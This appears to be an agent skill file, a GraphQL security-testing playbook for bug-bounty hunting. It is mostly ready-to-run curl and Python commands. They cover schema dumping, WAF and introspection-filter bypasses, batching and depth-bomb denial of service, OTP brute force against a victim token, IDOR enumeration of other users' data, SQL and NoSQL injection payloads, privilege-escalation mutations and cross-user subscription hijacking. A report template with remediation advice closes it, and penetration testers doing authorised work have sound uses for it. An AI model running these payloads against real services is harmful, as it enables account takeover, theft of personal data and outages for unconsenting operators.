---
name: graphql-audit
description: GraphQL security hunting — introspection abuse, field suggestion enumeration (clairvoyance), batching DoS, IDOR via aliasing, auth bypass, injection via arguments, subscription abuse, depth/complexity bombs, and WAF bypass. Covers graphw00f fingerprinting, gqlmap, graphql-cop, and inql. Use when a target exposes a /graphql, /api/graphql, or GQL-over-HTTP endpoint.
---

# GRAPHQL SECURITY AUDIT

> GraphQL flips the threat model — clients drive queries. One endpoint, infinite attack surface. Introspection hands you the schema; even without it, field suggestions give you 80% back.

---

## 0. QUICK KILL CHECKLIST

```
[ ] Run graphql_audit.sh <endpoint> — full automated sweep
[ ] Check if introspection is enabled (__schema query)
[ ] If introspection off — run clairvoyance for field discovery
[ ] Fingerprint engine (graphw00f) — different engines, different CVEs
[ ] Test query batching — send 100 identical queries in one POST
[ ] Test alias bombing — 1000 aliases in one query
[ ] Check field suggestions on typos — leaks schema even when introspection off
[ ] Try IDOR: query another user's object by ID, no auth check
[ ] Test field-level auth: query privileged fields (admin, role, internalNote)
[ ] Inject SQLi/NoSQLi via string arguments — id, filter, search args
[ ] Check subscriptions: can you subscribe to other users' events?
[ ] Try introspection bypass: __schema\nquery, query batching, fragment tricks
[ ] Look for mutation rate limiting — account takeover / self-XSS via mutations
```

---

## 1. TOOL — graphql_audit.sh

```bash
# Basic audit
bash tools/graphql_audit.sh https://target.com/graphql

# With auth cookie
bash tools/graphql_audit.sh https://target.com/api/graphql --cookie "session=abc123"

# With Authorization header
bash tools/graphql_audit.sh https://target.com/graphql --header "Authorization: Bearer TOKEN"

# Through Burp proxy
bash tools/graphql_audit.sh https://target.com/graphql --proxy http://127.0.0.1:8080

# Custom output directory
bash tools/graphql_audit.sh https://target.com/graphql --output-dir ./findings/target/graphql
```

**Output:** `findings/<target>/graphql/<timestamp>/`
- `introspection.json` — full schema dump (if enabled)
- `fingerprint.txt` — engine type (graphw00f)
- `field_suggestions.txt` — discovered fields via clairvoyance
- `batching_dos.txt` — response time delta for 1 vs 100 queries
- `alias_bomb.txt` — alias depth test results
- `gqlmap.txt` — injection scan results
- `cop_report.txt` — graphql-cop attack checklist results
- `summary.txt` — hit/miss per phase

---

## 2. INTROSPECTION — Schema Leak (Most Common First Step)

### Check If Enabled

```bash
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
```

### Full Schema Dump

```bash
# Pull complete introspection schema (pipe to InQL or graphql-voyager)
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"
  }' | jq . > schema.json
```

### What To Look For In The Schema

```
- Mutations involving user data: updateUser, deleteAccount, changeEmail, changePassword
- Queries returning other users' objects: user(id: X), order(id: X)
- Fields: internalNote, adminOnly, role, isAdmin, rawPassword, apiKey
- Types: AdminUser, InternalConfig, DebugInfo
- Deprecated fields — often bypassed auth or forgotten
- Subscription types — real-time data leaks
```

### Introspection Bypass Techniques

When `__schema` is blocked, try:
```bash
# Newline injection (bypasses naive keyword filters)
{"query": "query {\n  __schema\n  { queryType { name } } }"}

# Fragment trick
{"query": "fragment f on __Schema { queryType { name } } { ...f }"}

# __type instead of __schema (often overlooked in blocklists)
{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}

# Via GET request (some servers allow GET, filter only POST)
GET /graphql?query={__schema{queryType{name}}}

# Over WebSocket (GraphQL subscriptions)
# Different code path — introspection may be unrestricted
```

---

## 3. FIELD SUGGESTION ABUSE (Introspection Off — Still Works)

GraphQL engines return helpful "Did you mean X?" errors on typos. This leaks field names.

### Manual Probe

```bash
# Typo on a known field to trigger suggestions
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ usr { id } }"}' | grep -i "suggest\|did you mean\|Cannot query"
```

### Clairvoyance (Automated — Recommended)

```bash
# Install
pip install clairvoyance

# Run field discovery against a known type
clairvoyance -u https://target.com/graphql -o schema.json

# With auth
clairvoyance -u https://target.com/graphql \
  -H "Authorization: Bearer TOKEN" \
  -o schema.json

# Seed with known type names (speeds up discovery significantly)
clairvoyance -u https://target.com/graphql \
  --input-document schema_partial.json \
  -o schema_full.json
```

**What clairvoyance recovers:** type names, field names, argument names — ~80% of introspection output even when blocked.

---

## 4. BATCHING DoS (High Payout, Easy to Prove)

GraphQL allows sending multiple operations in one POST. No rate limit = DoS or brute-force amplifier.

### Array Batching (Most Common)

```bash
# 100 queries in one request — measure response time delta
python3 -c "
import json, sys
q = {'query': '{ __typename }'}
print(json.dumps([q] * 100))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @- -w '\nTime: %{time_total}s\n'
```

### Alias Batching (Bypasses per-query limits)

```bash
# 500 aliases — each alias is a separate resolver call
python3 -c "
aliases = ' '.join(f'q{i}: __typename' for i in range(500))
print('{\"query\": \"{ ' + aliases + ' }\"}')
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

### Impact Escalation

- **Brute force amplifier:** 100 login mutations per HTTP request → bypasses per-IP lockout
- **OTP bypass:** 1000 alias queries testing OTP codes in one request
- **Password reset bombing:** 100 resetPassword mutations, each with a different email

```bash
# OTP brute force via alias batching — chain with account takeover
python3 -c "
import json
mutations = []
for code in range(1000, 2000):
    mutations.append(f'v{code}: verifyOTP(code: \"{code}\", token: \"VICTIM_TOKEN\") {{ success }}')
query = '{ ' + ' '.join(mutations) + ' }'
print(json.dumps({'query': query}))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

---

## 5. IDOR VIA DIRECT OBJECT ACCESS

GraphQL queries often accept IDs directly. Test whether the server enforces ownership.

### Basic IDOR Probe

```bash
# Logged in as user A (id=1) — query user B's data
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=USER_A_COOKIE' \
  -d '{"query":"{ user(id: 2) { email phone address paymentMethods { last4 } } }"}'

# Try orders, messages, invoices, appointments
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=USER_A_COOKIE' \
  -d '{"query":"{ order(id: 999) { total items { name } user { email } } }"}'
```

### Field-Level IDOR (Privileged Fields on Accessible Objects)

```bash
# Object is yours — but are ALL fields yours to read?
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ me { id email role isAdmin internalNote rawApiKey } }"}'

# Test privileged mutations on other users
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { updateUser(id: 2, role: \"admin\") { success } }"}'
```

### Enumeration via Aliases

```bash
# Enumerate 50 user IDs in one request
python3 -c "
import json
aliases = [f'u{i}: user(id: {i}) {{ id email role }}' for i in range(1, 51)]
print(json.dumps({'query': '{ ' + ' '.join(aliases) + ' }'}))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

---

## 6. INJECTION VIA ARGUMENTS

GraphQL arguments pass directly to resolvers. Resolvers often pass them to SQL/NoSQL queries without sanitization.

### SQL Injection

```bash
# Classic SQLi probe via search/filter args
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(search: \"admin'\''--\") { id email } }"}'

# Time-based blind SQLi
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(id: \"1 AND SLEEP(5)--\") { email } }"}'

# gqlmap for automated injection
gqlmap --target https://target.com/graphql \
  --query '{ users(search: GQLMAP) { id email } }' \
  --dbms mysql
```

### NoSQL Injection (MongoDB common in GraphQL backends)

```bash
# MongoDB operator injection via JSON coercion
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ login(username: {\"$gt\": \"\"}, password: {\"$gt\": \"\"}) { token } }"}'

# Regex bypass
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(filter: {email: {\"$regex\": \".*\"}}) { id email } }"}'
```

### SSTI via Template-Rendered Fields

```bash
# If description/bio fields render in templates
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { updateProfile(bio: \"{{7*7}}\") { bio } }"}'
```

---

## 7. AUTHORIZATION BYPASS PATTERNS

### Unauthenticated Queries

```bash
# Try sensitive queries without any auth token
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ users { id email role } }"}'

# Try mutations without auth
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { createAdmin(email: \"test@example.com\", password: \"pass\") { id } }"}'
```

### Horizontal → Vertical Privilege Escalation

```bash
# Step 1: Find role mutation in schema
# Step 2: Call it as a regular user
curl -s -X POST https://target.com/graphql \
  -H 'Cookie: session=NORMAL_USER' \
  -d '{"query":"mutation { updateUserRole(userId: ME_ID, role: \"ADMIN\") { success } }"}'
```

### Deprecated Field Auth Bypass

```bash
# Deprecated fields are often forgotten — auth checks removed or loosened
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ userProfile(id: 2) { legacyToken adminFlags } }"}'
```

---

## 8. SUBSCRIPTION ABUSE

WebSocket-based subscriptions can leak cross-user events if not scoped per-user.

```bash
# Subscribe to another user's events (Burp WebSocket tab or wscat)
# First: capture legitimate subscription query in Burp
# Then: change userId to victim's ID

wscat -c wss://target.com/graphql \
  -s 'graphql-ws' \
  --execute '{"type":"start","id":"1","payload":{"query":"subscription { orderUpdated(userId: VICTIM_ID) { status total } }"}}'

# Check if subscription delivers events for ALL users (no scoping)
# Critical if: payment status, message content, location updates
```

---

## 9. DEPTH / COMPLEXITY BOMBS

No query depth/complexity limits = DoS.

```bash
# Circular reference bomb (if schema has circular types)
# e.g. User -> friends -> User -> friends -> ...
python3 -c "
depth = 20
inner = 'id email'
for _ in range(depth):
    inner = f'friends {{ id {inner} }}'
print('{\"query\": \"{ me { ' + inner + ' } }\"}')
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @- -w '\nTime: %{time_total}s\n'

# If response time grows linearly — report as DoS
```

---

## 10. FINGERPRINTING & CVE HUNTING (graphw00f)

Different GraphQL engines have different CVEs. Fingerprint first.

```bash
# Install
pip install graphw00f

# Fingerprint
python3 -m graphw00f.main -d -t https://target.com/graphql

# Common engines and their known issues:
# Hasura       — auth bypass, remote schema injection
# Apollo       — query depth issues in old versions
# GraphQL-Go   — various older CVEs
# Graphene     — Python injection risk in custom resolvers
# Hot Chocolate — .NET, watch for SSRF in federation
# WPGraphQL    — WordPress + GraphQL = lots of IDOR
```

---

## 11. graphql-cop — Automated Attack Checklist

```bash
# Install
pip install graphql-cop

# Run all checks
graphql-cop -t https://target.com/graphql

# With auth
graphql-cop -t https://target.com/graphql \
  -H "Authorization: Bearer TOKEN"

# Checks performed:
# - Introspection enabled
# - Field suggestions enabled
# - GET method supported
# - Query batching enabled
# - Alias overloading
# - Directive overloading
# - Deep recursion allowed
# - Character limit missing
# - Mutation introspection
```

---

## 12. WAF BYPASS FOR GRAPHQL

```bash
# Content-type switching (some WAFs only filter application/json)
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/graphql' \
  -d '{ __schema { queryType { name } } }'

# GET introspection (WAF may only block POST)
curl -s "https://target.com/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"

# Comment injection to break keyword matching
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ __sch#comment\nema { queryType { name } } }"}'

# Fragment-based introspection
curl -s -X POST https://target.com/graphql \
  -d '{"query":"fragment s on __Schema { queryType { name } } query { ...s }"}'
```

---

## 13. CHAINING FINDINGS

| Chain | Severity |
|---|---|
| Introspection → find admin mutations → call without auth | Critical |
| Batching → OTP brute force → account takeover | Critical |
| Field suggestions → discover hidden field → IDOR | High |
| Alias bomb → bypass rate limit → credential stuffing | High |
| Unauthenticated subscription → real-time PII leak | High |
| Depth bomb → no query limits → DoS | Medium |
| Deprecated field → PII exposure | Medium |

---

## 14. REPORT TEMPLATE

```
Title: GraphQL [VULN TYPE] — [Impact One-liner]

Example titles:
- "GraphQL Introspection Enabled — Full Schema Disclosure on api.target.com"
- "GraphQL Batching Allows OTP Brute Force — Account Takeover via Alias Bombing"
- "GraphQL IDOR via Direct Object Queries — Access Any User's Private Data"

Endpoint: POST https://target.com/graphql

Request:
[paste raw curl or HTTP request]

Response:
[paste relevant portion of response]

Impact:
[what an attacker can actually do RIGHT NOW — no hypotheticals]

Steps to Reproduce:
1. [exact curl or Burp Repeater step]
2. [observe the response]
3. [confirm impact]

CVSS (approximate):
- Introspection only: CVSS 5.3 (Medium) — info disclosure
- IDOR cross-user: CVSS 7.5-8.5 (High)
- Batching ATO chain: CVSS 9.0+ (Critical)
- Unauthenticated mutation: CVSS 9.8 (Critical)

Remediation:
- Disable introspection in production (allow only in dev environments)
- Enforce per-query depth limit (recommend <= 10)
- Enforce complexity limits
- Disable query batching or add per-batch rate limits
- Validate object ownership in every resolver (not just at route level)
- Remove field suggestions in production
```

---

## KILL SIGNALS — Walk Away

```
- Endpoint returns 404/410 consistently — not active
- All queries return generic "Unauthorized" with no suggestions — well-hardened
- Rate limit fires on query 2 — strong protection, low ROI
- Only __typename accessible, no types — schema fully locked down
- Engine is Apollo Federation gateway only — attack the downstream services instead
```

---

## TOOLS REFERENCE

| Tool | Purpose | Install |
|---|---|---|
| `graphql_audit.sh` | Automated multi-phase sweep | this repo |
| `graphw00f` | Engine fingerprinting | `pip install graphw00f` |
| `clairvoyance` | Field discovery (no introspection) | `pip install clairvoyance` |
| `graphql-cop` | Attack checklist runner | `pip install graphql-cop` |
| `gqlmap` | SQL/NoSQL injection scanner | `pip install gqlmap` |
| `inql` | Burp Suite extension — schema + IDOR | Burp BApp Store |
| `graphql-voyager` | Visual schema explorer | browser tool |
| `wscat` | WebSocket subscription testing | `npm i -g wscat` |
